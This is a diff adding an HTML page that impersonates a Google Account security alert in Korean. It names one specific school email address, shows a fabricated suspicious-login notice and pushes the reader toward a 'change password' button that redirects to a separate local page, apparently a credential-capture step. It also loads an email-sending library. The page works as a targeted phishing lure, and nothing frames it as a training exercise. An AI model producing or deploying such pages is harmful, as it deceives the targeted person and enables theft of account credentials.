@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>보안 알림</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f1f3f4;
+    }
+
+    /* Top bar */
+    .topbar {
+      padding: 15px 20px;
+      font-size: 18px;
+      color: #5f6368;
+    }
+
+    /* Center container */
+    .container {
+      display: flex;
+      justify-content: center;
+      margin-top: 80px;
+    }
+
+    .card {
+      width: 420px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+
+    /* Red header */
+    .header {
+      background-color: #d93025;
+      color: white;
+      padding: 15px;
+      font-weight: bold;
+    }
+
+    .content {
+      padding: 20px;
+      color: #202124;
+    }
+
+    .time {
+      font-size: 13px;
+      color: #5f6368;
+      margin-bottom: 10px;
+    }
+
+    .title {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .email {
+      color: #5f6368;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .desc {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    /* Device box */
+    .device {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .device-icon {
+      width: 40px;
+      height: 60px;
+      background: #9aa0a6;
+      border-radius: 4px;
+      margin-right: 15px;
+    }
+
+    .device-text {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    /* Buttons */
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .btn {
+      padding: 10px 15px;
+      border-radius: 20px;
+      font-size: 14px;
+      border: 1px solid #dadce0;
+      cursor: pointer;
+    }
+
+    .btn-red {
+      color: #d93025;
+      background: white;
+    }
+
+    .btn-blue {
+      color: #1a73e8;
+      background: white;
+    }
+
+    #p2 {
+        display: none;
+    }
+    #p3 {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">Google 계정</div>
+
+  <div class="container">
+    <div class="card">
+
+      <div class="header" id="head">
+        중요 보안 알림
+      </div>
+
+      <div class="content" id="p2">
+        <div class="title">계정 보안에 문제가 발생했을 수도 있습니다</div>
+        <div class="desc">다른 사람이 귀하의 비밀번호를 알고 있다고 의심되므로 즉시 비밀번호를 변경하시기 바랍니다.</div>
+        <div class="buttons">
+          <div class="btn btn-blue" id="p2no">취소</div>
+          <div class="btn btn-red" id="p2yes">비밀번호 변경</div>
+        </div>
+      </div>
+
+      <div class="content" id="p3">
+        <div class="title">로그인 시도가 차단됨</div>
+        <div class="desc">다음과 같은 경우 본인 확인을 위해 Google에서 추가 로그인 단계를 완료하라고 요청할 수 있습니다.
+<br> <ul><li>평소 로그인하는 장소가 아닌 곳에서 로그인하는 경우</li> <br>
+<li>이전에 사용하지 않았던 기기를 사용하는 경우</li></ul></div>
+<div class="btn btn-blue" id="p3no">취소</div>
+      </div>
+
+      <div class="content" id="p1">
+        <div class="time">4월 5일 오전 4:14</div>
+
+        <div class="title">의심스러운 로그인 시도가 차단됨</div>
+
+        <div class="email">26-11115@boin.hs.kr</div>
+
+        <div class="desc">
+          Google에서 귀하의 비밀번호를 아는 사람이 계정에 로그인하려는 시도를 차단했습니다.
+          본인의 활동이 아니라면 즉시 비밀번호를 변경하시기 바랍니다.
+        </div>
+
+        <div class="device">
+          <div class="device-icon"></div>
+          <div class="device-text">
+            알 수 없는 기기<br>
+            브라우저: Chrome 146.0<br>
+            대한민국 대전광역시
+          </div>
+        </div>
+
+        <div class="desc">
+          최근에 Google 계정 로그인이 차단된 적이 있나요?
+        </div>
+
+        <div class="buttons">
+          <div class="btn btn-red" id='no'>아니요 (계정 보안 강화)</div>
+          <div class="btn btn-blue" id='yes'>예, 본인의 활동입니다</div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <script>
+    const b1 = document.getElementById('no');
+    const b2 = document.getElementById('yes');
+
+    const p1 = document.getElementById('p1');
+    const p2 = document.getElementById('p2');
+    const p3 = document.getElementById('p3');
+
+    b1.addEventListener('click', function() {
+        p1.style.display = 'none';
+        p2.style.display = 'block';
+    });
+    b2.addEventListener('click', function() {
+        p1.style.display = 'none';
+        p3.style.display = 'block';
+        document.getElementById("head").style.display = 'none';
+    });
+
+    document.getElementById('p2no').addEventListener('click', function() {
+      p2.style.display = 'none';
+      p1.style.display = 'block';
+    })
+    document.getElementById('p2yes').addEventListener('click', function() {
+      window.location.href = 'changecode.html';
+    })
+    document.getElementById('p3no').addEventListener('click', function() {
+      p1.style.display = 'block';
+      p3.style.display = 'none';
+      document.getElementById("head").style.display = 'block';
+    })
+  </script>
+
+</body>
+</html>
